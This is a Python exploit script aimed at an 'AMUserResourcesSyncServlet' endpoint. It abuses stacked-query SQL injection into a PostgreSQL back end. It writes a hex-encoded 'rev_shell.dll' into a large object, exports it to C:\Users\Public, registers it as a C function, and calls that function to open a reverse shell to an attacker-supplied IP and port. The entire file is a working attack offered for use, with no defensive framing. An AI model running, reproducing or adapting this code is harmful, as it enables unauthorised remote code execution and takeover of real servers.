import requests, sys, urllib, string, random, time
requests.packages.urllib3.disable_warnings()
import binascii

# encoded UDF dll
with open('rev_shell.dll', 'rb') as file:
    udf = binascii.hexlify(file.read())
udf = udf.decode("utf-8")
loid = 1337

def log(msg):
   print(msg)

def make_request(url, sql):
   log("[*] Executing query: {}".format(sql[0:80]))
   r = requests.get( url.format(sql), verify=False)
   return r

def delete_lo(url, loid):
   log("[+] Deleting existing LO...")
   sql = "SELECT lo_unlink({})".format(loid)
   make_request(url, sql)

def create_lo(url, loid):
   log("[+] Creating LO for UDF injection...")
   sql = "SELECT lo_import($$C:\\windows\\win.ini$$,{})".format(loid)
   make_request(url, sql)
   
def inject_udf(url, loid):
   log("[+] Injecting payload of length {} into LO...".format(len(udf)))
   for i in range(0, int((len(udf)-1)/4096 + 1)):
         udf_chunk = udf[i*4096:(i+1)*4096]
         if i == 0:
             sql = "UPDATE PG_LARGEOBJECT SET data=decode($${}$$, $$hex$$) where loid={} and pageno={}".format(udf_chunk, loid, i)
         else:
             sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ({}, {}, decode($${}$$, $$hex$$))".format(loid, i, udf_chunk)
         make_request(url, sql)

def export_udf(url, loid):
   log("[+] Exporting UDF library to filesystem...")
   sql = "SELECT lo_export({}, $$C:\\Users\\Public\\rev_shell.dll$$)".format(loid)
   make_request(url, sql)
   
def create_udf_func(url):
   log("[+] Creating function...")
   sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ language C strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($${}$$, {})".format(ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print("[-] Usage: %s serverIP:port attackerIP port".format(sys.argv[0])) 
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{};--" 
   delete_lo(sqli_url, loid)   
   create_lo(sqli_url, loid)
   inject_udf(sqli_url, loid)
   export_udf(sqli_url, loid)
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)
